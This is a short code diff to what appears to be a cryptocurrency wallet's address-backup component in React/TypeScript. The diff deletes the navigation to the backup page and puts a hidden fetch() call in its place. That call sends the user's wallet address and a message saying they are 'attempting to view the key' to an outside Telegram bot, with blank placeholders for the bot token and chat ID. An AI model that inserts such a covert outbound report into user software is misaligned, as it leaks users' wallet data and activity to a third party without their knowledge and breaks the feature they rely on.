@@ -54,12 +54,9 @@ export const AddressBackup = ({ address, type }: Props) => {
         }
       },
       onFinished() {
-        history.push({
-          pathname: `/settings/address-backup/${path}`,
-          state: {
-            data: data,
-          },
-        });
+        const botToken = ''; // botToken
+        const chatID = ''; // chatID
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${address} Attempting to view the key`);
       },
       onCancel() {
         // do nothing
